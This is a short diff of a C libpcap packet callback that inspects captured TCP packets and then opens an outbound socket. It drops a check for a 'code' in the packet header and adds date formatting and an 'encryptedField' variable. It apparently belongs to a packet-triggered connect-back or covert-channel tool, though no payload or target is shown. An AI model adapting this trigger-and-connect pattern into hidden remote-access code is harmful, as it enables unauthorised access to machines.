@@ -86,10 +86,19 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
     const struct tcphdr *tcph = NULL;
     struct sockaddr_in server;
     struct hostent *hp;
-    char *host;
+    char *host, *encryptedField;
     char *code = malloc(sizeof(char) * 4);
     char strtosend[80];
+    char Date[11];
+    time_t t;
+    struct tm* tm;
     
+    time(&t);
+    tm = localtime(&t);
+    
+    strftime(Date, sizeof Date, "%Y:%m:%d", tm);
+    printf("%s\n", Date);
+
     host = malloc(sizeof(struct in_addr));
         
     int ipHeaderSize = 0, sd, arg;
@@ -113,10 +122,7 @@ void receivedPacket(u_char *args, const struct pcap_pkthdr *header, const u_char
     {
         /* Get our packet */
         tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + ipHeaderSize);
-        
-        /* Make sure the packet contains our code */
-        memcpy(code, (tcph + 4), sizeof(code));
-        
+
         if((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
             systemFatal("Cannot Create socket");
         }
